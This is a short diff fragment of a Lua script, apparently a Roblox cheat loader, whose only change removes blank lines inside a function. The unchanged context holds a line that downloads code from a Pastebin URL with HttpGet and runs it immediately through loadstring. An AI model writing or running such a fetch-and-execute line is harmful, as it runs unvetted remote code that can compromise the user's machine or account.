@@ -4,8 +4,6 @@ end
 local function f()
 loadstring(game:HttpGet("https://pastebin.com/raw/EHsRLvqE"))()
 
-
-
 end
 
 task.spawn(s)
